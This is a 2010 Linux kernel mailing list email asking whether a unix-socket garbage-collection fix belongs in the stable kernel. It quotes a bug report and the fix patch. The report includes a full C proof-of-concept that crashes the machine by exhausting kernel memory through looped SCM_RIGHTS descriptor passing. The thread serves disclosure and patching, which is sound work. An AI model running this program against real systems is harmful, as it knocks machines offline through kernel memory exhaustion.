From: Michal Hocko <mhocko@suse.cz>
Subject: Re: [PATCH] af_unix: limit unix_tot_inflight
Date: Fri, 26 Nov 2010 09:50:00 +0100
Message-ID: <20101126085000.GA4532@tiehlicka.suse.cz>
References: <AANLkTi=Q967xpX0KLMwX-=_4_1AKO5wjHEuJ1TrNjCj9@mail.gmail.com>
 <1290553918.2866.80.camel@edumazet-laptop>
 <1290590335.3464.24.camel@edumazet-laptop>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Cc: Vegard Nossum <vegard.nossum@gmail.com>,
	David Miller <davem@davemloft.net>,
	LKML <linux-kernel@vger.kernel.org>,
	Andrew Morton <akpm@linux-foundation.org>,
	Eugene Teo <eugene@redhat.com>,
	netdev <netdev@vger.kernel.org>,
	Eric Dumazet <eric.dumazet@gmail.com>
To: stable@kernel.org
Return-path: <linux-kernel-owner@vger.kernel.org>
Content-Disposition: inline
In-Reply-To: <1290590335.3464.24.camel@edumazet-laptop>
Sender: linux-kernel-owner@vger.kernel.org
List-Id: netdev.vger.kernel.org

Shouldn't this go to stable?
AFAICS 2.6.32 contains the same code (the patch applies). 
I haven't tried to reproduce the issue yet.

On Wed 24-11-10 10:18:55, Eric Dumazet wrote:
> Le mercredi 24 novembre 2010 ?? 00:11 +0100, Eric Dumazet a ??crit :
> > Le mardi 23 novembre 2010 ?? 23:21 +0100, Vegard Nossum a ??crit :
> > > Hi,
> > > 
> > > I found this program lying around on my laptop. It kills my box
> > > (2.6.35) instantly by consuming a lot of memory (allocated by the
> > > kernel, so the process doesn't get killed by the OOM killer). As far
> > > as I can tell, the memory isn't being freed when the program exits
> > > either. Maybe it will eventually get cleaned up the UNIX socket
> > > garbage collector thing, but in that case it doesn't get called
> > > quickly enough to save my machine at least.
> > > 
> > > #include <sys/mount.h>
> > > #include <sys/socket.h>
> > > #include <sys/un.h>
> > > #include <sys/wait.h>
> > > 
> > > #include <errno.h>
> > > #include <fcntl.h>
> > > #include <stdio.h>
> > > #include <stdlib.h>
> > > #include <string.h>
> > > #include <unistd.h>
> > > 
> > > static int send_fd(int unix_fd, int fd)
> > > {
> > >         struct msghdr msgh;
> > >         struct cmsghdr *cmsg;
> > >         char buf[CMSG_SPACE(sizeof(fd))];
> > > 
> > >         memset(&msgh, 0, sizeof(msgh));
> > > 
> > >         memset(buf, 0, sizeof(buf));
> > >         msgh.msg_control = buf;
> > >         msgh.msg_controllen = sizeof(buf);
> > > 
> > >         cmsg = CMSG_FIRSTHDR(&msgh);
> > >         cmsg->cmsg_len = CMSG_LEN(sizeof(fd));
> > >         cmsg->cmsg_level = SOL_SOCKET;
> > >         cmsg->cmsg_type = SCM_RIGHTS;
> > > 
> > >         msgh.msg_controllen = cmsg->cmsg_len;
> > > 
> > >         memcpy(CMSG_DATA(cmsg), &fd, sizeof(fd));
> > >         return sendmsg(unix_fd, &msgh, 0);
> > > }
> > > 
> > > int main(int argc, char *argv[])
> > > {
> > >         while (1) {
> > >                 pid_t child;
> > > 
> > >                 child = fork();
> > >                 if (child == -1)
> > >                         exit(EXIT_FAILURE);
> > > 
> > >                 if (child == 0) {
> > >                         int fd[2];
> > >                         int i;
> > > 
> > >                         if (socketpair(PF_UNIX, SOCK_SEQPACKET, 0, fd) == -1)
> > >                                 goto out_error;
> > > 
> > >                         for (i = 0; i < 100; ++i) {
> > >                                 if (send_fd(fd[0], fd[0]) == -1)
> > >                                         goto out_error;
> > > 
> > >                                 if (send_fd(fd[1], fd[1]) == -1)
> > >                                         goto out_error;
> > >                         }
> > > 
> > >                         close(fd[0]);
> > >                         close(fd[1]);
> > >                         goto out;
> > > 
> > >                 out_error:
> > >                         fprintf(stderr, "error: %s\n", strerror(errno));
> > >                 out:
> > >                         exit(EXIT_SUCCESS);
> > >                 }
> > > 
> > >                 while (1) {
> > >                         pid_t kid;
> > >                         int status;
> > > 
> > >                         kid = wait(&status);
> > >                         if (kid == -1) {
> > >                                 if (errno == ECHILD)
> > >                                         break;
> > >                                 if (errno == EINTR)
> > >                                         continue;
> > > 
> > >                                 exit(EXIT_FAILURE);
> > >                         }
> > > 
> > >                         if (WIFEXITED(status)) {
> > >                                 if (WEXITSTATUS(status))
> > >                                         exit(WEXITSTATUS(status));
> > >                                 break;
> > >                         }
> > >                 }
> > >         }
> > > 
> > >         return EXIT_SUCCESS;
> > > }
> > > 
> > > 
> > > Vegard
> > > --
> 
> Here is a patch to address this problem.
> 
> Thanks
> 
> [PATCH] af_unix: limit unix_tot_inflight
> 
> Vegard Nossum found a unix socket OOM was possible, posting an exploit
> program.
> 
> My analysis is we can eat all LOWMEM memory before unix_gc() being
> called from unix_release_sock(). Moreover, the thread blocked in
> unix_gc() can consume huge amount of time to perform cleanup because of
> huge working set.
> 
> One way to handle this is to have a sensible limit on unix_tot_inflight,
> tested from wait_for_unix_gc() and to force a call to unix_gc() if this
> limit is hit.
> 
> This solves the OOM and also reduce overall latencies, and should not
> slowdown normal workloads.
> 
> Reported-by: Vegard Nossum <vegard.nossum@gmail.com>
> Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com>
> Cc: Andrew Morton <akpm@linux-foundation.org>
> Cc: Eugene Teo <eugene@redhat.com>
> ---
>  net/unix/garbage.c |    7 +++++++
>  1 files changed, 7 insertions(+)
> 
> diff --git a/net/unix/garbage.c b/net/unix/garbage.c
> index c8df6fd..40df93d 100644
> --- a/net/unix/garbage.c
> +++ b/net/unix/garbage.c
> @@ -259,9 +259,16 @@ static void inc_inflight_move_tail(struct unix_sock *u)
>  }
>  
>  static bool gc_in_progress = false;
> +#define UNIX_INFLIGHT_TRIGGER_GC 16000
>  
>  void wait_for_unix_gc(void)
>  {
> +	/*
> +	 * If number of inflight sockets is insane,
> +	 * force a garbage collect right now.
> +	 */
> +	if (unix_tot_inflight > UNIX_INFLIGHT_TRIGGER_GC && !gc_in_progress)
> +		unix_gc();
>  	wait_event(unix_gc_wait, gc_in_progress == false);
>  }
>  
> 
> 
> --
> To unsubscribe from this list: send the line "unsubscribe linux-kernel" in
> the body of a message to majordomo@vger.kernel.org
> More majordomo info at  http://vger.kernel.org/majordomo-info.html
> Please read the FAQ at  http://www.tux.org/lkml/

-- 
Michal Hocko
L3 team 
SUSE LINUX s.r.o.
Lihovarska 1060/12
190 00 Praha 9    
Czech Republic
